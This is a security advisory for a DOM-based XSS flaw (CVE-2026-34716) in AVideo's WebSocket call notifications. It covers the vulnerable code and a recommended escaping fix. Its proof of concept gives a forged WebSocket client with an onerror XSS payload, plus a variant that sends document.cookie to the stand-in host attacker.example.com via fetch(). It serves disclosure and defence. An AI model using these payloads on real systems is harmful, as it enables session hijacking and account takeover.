# [M] AVideo: DOM XSS via Unsanitized Display Name in WebSocket Call Notification

## Summary
Severity: Medium
Advisory: GHSA-w4hp-w536-jg64
CVE: CVE-2026-34716
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-w4hp-w536-jg64
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The AVideo YPTSocket plugin's caller feature renders incoming call notifications using the jQuery Toast Plugin, passing the caller's display name directly as the `heading` parameter. The toast plugin constructs the heading as raw HTML (`'<h2>' + heading + '</h2>'`) and inserts it into the DOM via jQuery's `.html()` method, which parses and executes any embedded HTML or script content. An attacker can set their display name to an XSS payload and trigger code execution on any online user's browser simply by initiating a call - no victim interaction is required beyond being connected to the WebSocket.

## Details

When a call notification arrives via WebSocket, the caller's identity is extracted from the JSON message:

```javascript
// plugin/YPTSocket/caller.js:73
userIdentification = json.from_identification;
```

This value is passed directly to the jQuery Toast Plugin as the heading:

```javascript
// plugin/YPTSocket/caller.js:89
heading: userIdentification,
```

Inside the jQuery Toast Plugin, the heading is rendered as raw HTML:

```javascript
// node_modules/jquery-toast-plugin/src/jquery.toast.js:60
// Constructs: '<h2>' + heading + '</h2>'
// Then inserts via .html()
```

jQuery's `.html()` method parses the string as HTML and executes any script-bearing elements (such as `<img onerror>`, `<svg onload>`, etc.).

There is a secondary injection vector in the same file where the full JSON message is placed inside a single-quoted `onclick` attribute:

```javascript
// plugin/YPTSocket/caller.js:121-123
imageAndButton += '<button class="btn btn-danger btn-circle incomeCallBtn" onclick=\'hangUpCall(' + JSON.stringify(json) + ')\'><i class="fas fa-phone-slash"></i></button>';
if (isJsonReceivingCall(json)) {
    imageAndButton += '<button class="btn btn-success btn-circle incomeCallBtn" onclick=\'acceptCall(' + JSON.stringify(json) + ')\'><i class="fas fa-phone"></i></button>';
```

`JSON.stringify(json)` is placed inside a single-quoted `onclick` attribute. If any field in `json` contains a single quote, it breaks the attribute boundary and allows attribute injection.

## Proof of Concept

**Important note on the attack vector:** `User::setName()` at `objects/user.php:2069` uses `strip_tags()`, so the display name IS sanitized on the server side when set through the normal UI or API. However, the WebSocket server relays call messages as-is without server-side validation of the `from_identification` field. A malicious WebSocket client can send any `from_identification` value directly over the WebSocket protocol, bypassing the server-side sanitization entirely. The attack requires a custom WebSocket client, not the normal UI.

**Step 1: Connect a malicious WebSocket client and send a forged call message**

The following JavaScript connects directly to the AVideo WebSocket server and sends a call message with an XSS payload in the `from_identification` field:

```javascript
// Malicious WebSocket client - bypasses server-side strip_tags() sanitization
const ws = new WebSocket('wss://your-avideo-instance.com:8888');

ws.onopen = function() {
    // Send a forged call message with HTML in from_identification
    const payload = {
        msg: 'call',
        from_users_id: 1,
        to_users_id: VICTIM_USER_ID,
        from_identification: '<img src=x onerror=alert(document.cookie)>',
        resourceURL: 'https://your-avideo-instance.com/meet/123'
    };
    ws.send(JSON.stringify(payload));
    console.log('Forged call message sent');
};
```

**Step 2:** When the victim receives the call notification, the toast renders `from_identification` as HTML via jQuery's `.html()`. The `<img>` tag triggers the `onerror` handler, executing JavaScript in the victim's browser context.

More advanced payload for credential exfiltration:

```javascript
// Credential exfiltration via forged WebSocket call
const ws = new WebSocket('wss://your-avideo-instance.com:8888');
ws.onopen = function() {
    ws.send(JSON.stringify({
        msg: 'call',
        from_users_id: 1,
        to_users_id: VICTIM_USER_ID,
        from_identification: '<img src=x onerror="fetch(\'https://attacker.example.com/log?\'+document.cookie)">',
        resourceURL: 'https://your-avideo-instance.com/meet/123'
    }));
};
```

Reproduction steps:

1. Identify the WebSocket server address for the target AVideo instance (typically port 8888).
2. Connect a custom WebSocket client to the server.
3. Send a call message with `from_identification` set to `<img src=x onerror=alert(document.cookie)>`.
4. Ensure a victim user is online and connected to the WebSocket (any authenticated page with YPTSocket loaded).
5. Observe the XSS payload executing in the victim's browser when the toast notification appears. No victim interaction is required.

## Impact

This is a zero-click stored XSS vulnerability. The victim does not need to click anything - merely being connected to the WebSocket (which happens automatically on any authenticated page load) is sufficient for the attack to succeed. The attacker controls when the payload fires by initiating a call.

Consequences include:

- **Session hijacking**: Steal the victim's session cookie and impersonate them.
- **Account takeover**: If the victim is an administrator, the attacker gains full platform control.
- **Worm propagation**: The XSS payload can automatically change the victim's display name to the same payload and call other online users, creating a self-propagating worm.
- **Keylogging and credential theft**: Inject persistent scripts that capture keystrokes on the current page.

The attack is zero-click and can target any specific online user.

- **CWE**: CWE-79 (Cross-Site Scripting - DOM-based)

## Recommended Fix

HTML-escape the heading value before passing it to `$.toast()` at `plugin/YPTSocket/caller.js:89`:

```javascript
heading: $('<span>').text(userIdentification).html(),
```

This uses jQuery's `.text()` to safely encode the user-controlled string, then extracts the escaped HTML via `.html()`.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-w4hp-w536-jg64
- https://nvd.nist.gov/vuln/detail/CVE-2026-34716
- https://github.com/WWBN/AVideo
